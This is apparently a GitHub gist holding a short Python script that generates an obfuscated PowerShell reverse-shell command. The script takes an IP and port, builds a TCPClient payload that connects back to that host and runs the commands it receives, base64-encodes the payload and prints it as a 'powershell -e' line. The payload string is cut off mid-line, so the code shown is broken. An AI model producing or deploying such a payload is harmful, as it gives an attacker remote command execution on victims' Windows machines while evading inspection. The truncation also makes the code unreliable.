#date: 2022-02-11T17:10:11Z
#url: https://api.github.com/gists/61d4cd4d8c8099d7c7512cfede739ca0
#owner: https://api.github.com/users/t3l3machus

#!/usr/bin/env python3
#
# generate reverse powershell cmdline with base64 encoded args
# Original by https://gist.github.com/tothi/ab288fb523a4b32b51a53e542d40fe58
# When i discovered the script the payload didn't seem to work. I replaced it with a similar one and slightly modified the script, it works as a charm.

import sys
import base64

def help():
    print("USAGE: %s IP PORT" % sys.argv[0])
    print("Returns reverse shell PowerShell base64 encoded cmdline payload connecting to IP:PORT")
    exit()
    
try:
    (ip, port) = (sys.argv[1], int(sys.argv[2]))
except:
    help()

payload = f'$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName Sys>

cmdline = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmdline)
